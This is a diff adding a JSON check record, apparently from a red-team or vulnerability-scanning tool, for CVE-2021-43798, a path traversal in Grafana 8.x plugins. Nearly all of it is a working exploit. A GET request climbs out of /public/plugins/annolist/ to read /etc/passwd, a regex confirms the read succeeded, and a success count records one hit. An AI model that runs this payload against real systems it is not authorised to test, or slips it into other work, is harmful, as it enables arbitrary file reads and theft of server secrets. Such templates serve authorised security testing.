@@ -1,0 +1,35 @@
+{
+  "name": "redteam/Grafana plugin path traversal",
+  "description": "[god] CVE-2021-43798 — Grafana 8.x plugin path traversal (GHSA-8pjx-jj86-j47p, Grafana security release): /public/plugins/<id>/../.. reaches arbitrary files; annolist exists in every default install. Keywords: grafana plugin path traversal cve-2021-43798 public plugins arbitrary file. ctrl: patched builds 400/404 the escape -> not falsified. base_url = Grafana root.",
+  "cwe": "CWE-22",
+  "requests": {
+    "payload": {
+      "method": "GET",
+      "url": "{{base_url}}/public/plugins/annolist/../../../../../../../../etc/passwd"
+    },
+    "baseline": {
+      "method": "GET",
+      "url": "{{base_url}}/public/plugins/annolist/"
+    }
+  },
+  "conditions": [
+    {
+      "type": "body_regex",
+      "request": "payload",
+      "pattern": "root:[a-z*]{1,12}:0:0"
+    },
+    {
+      "type": "status",
+      "request": "baseline",
+      "equals": 200
+    }
+  ],
+  "params": [
+    "base_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "e8c9a9300f03",
+  "created": "2026-11-06T00:00:00+00:00",
+  "last_used": "2026-11-06T00:00:00+00:00"
+}
